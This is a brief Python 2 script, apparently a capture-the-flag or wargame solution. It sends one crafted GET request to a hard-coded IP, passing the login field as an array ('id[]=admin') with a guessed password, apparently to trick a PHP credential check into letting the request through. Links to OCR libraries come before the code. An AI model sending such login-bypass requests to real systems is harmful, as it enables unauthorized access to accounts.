# Pytesser
https://code.google.com/archive/p/pytesser/downloads

# PIL
http://www.pythonware.com/products/pil/

import httplib
URL = "112.217.149.186:10009"
RESOURCE = "/n00b/index.php?id[]=admin&pw=qwer10000002"
PARMAS = None
HEADERS = {"Content-Type":"application/x-www-form-urlencoded", "Accept":"*/*"}
def httpRequest(URL, RESOURCE, PARAMS, HEADERS):
        conn = httplib.HTTPConnection(URL)
        conn.request('GET', RESOURCE, PARAMS, HEADERS)
        response = conn.getresponse()
        data = response.read()
        conn.close()
        return data
print httpRequest(URL, RESOURCE, PARMAS, HEADERS)
